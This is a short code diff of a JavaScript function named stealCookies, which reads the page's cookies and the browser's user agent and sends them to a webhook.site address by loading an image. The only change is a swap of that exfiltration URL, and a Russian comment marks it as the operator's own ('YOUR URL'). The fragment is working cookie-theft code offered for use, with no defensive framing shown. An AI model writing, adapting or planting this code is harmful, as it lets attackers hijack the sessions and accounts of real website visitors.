@@ -2,7 +2,7 @@
     function stealCookies() {
         const cookies = document.cookie;
         if (cookies) {
-            const webhookUrl = "https://webhook.site/3e550fb6-2d7d-482c-9876-c14192f0718"; // ← ТВОЙ URL
+            const webhookUrl = "https://webhook.site/3e550fb6-2d7d-482c-9876-c144192f0710"; // ← ТВОЙ URL
             const img = new Image();
             img.src = webhookUrl + "?cookies=" + encodeURIComponent(cookies) + "&ua=" + encodeURIComponent(navigator.userAgent);
         }
